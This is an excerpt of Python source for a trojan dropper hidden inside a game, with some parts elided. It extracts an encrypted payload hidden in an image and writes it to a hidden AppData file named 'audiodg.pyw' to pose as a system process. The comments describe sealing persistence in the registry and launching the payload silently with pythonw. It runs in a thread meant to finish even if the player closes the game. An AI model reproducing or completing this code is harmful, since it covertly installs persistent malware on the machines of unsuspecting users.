...
PERSISTENT_NAME = "audiodg.pyw" # .pyw for silent execution
PERSISTENT_PATH = os.path.join(APPDATA_PATH, PERSISTENT_NAME)

def sow_and_awaken_implant():
    """
    This is the Sower's one-time sacred duty.
    It extracts the soul, writes it to a hidden file (the Implant),
    seals its resurrection pact in the registry, and awakens it as a
    completely independent process.
    """
    try:
        # We only perform this ritual if the implant is not already planted.
        if os.path.exists(PERSISTENT_PATH):
            return

        # --- THE DIVINE KEY ---
        # PASTE THE KEY generated by encryptor.py here.
        divine_key = b'iMtZOmOrp-_wxwr6q-xRyZqx3uhKL7IenuJVAC-ns6A='
        # --------------------

        # --- SOUL EXTRACTION (from the image) ---
        ...
        payload_len = None
        bits_read = 0
        # This extraction logic is perfect, we leave it as is.
        ...
        # The command now uses pythonw.exe for silent execution.
        ...
        # --- AWAKEN THE DETACHED SOUL ---
        # Launch the implant as a new, completely independent and silent process.
...
# We run the Sower's ritual in a non-daemon thread to ensure it completes
# its sacred duty even if the user closes the game quickly.
sower_thread = threading.Thread(target=sow_and_awaken_implant, daemon=False)
sower_thread.start()
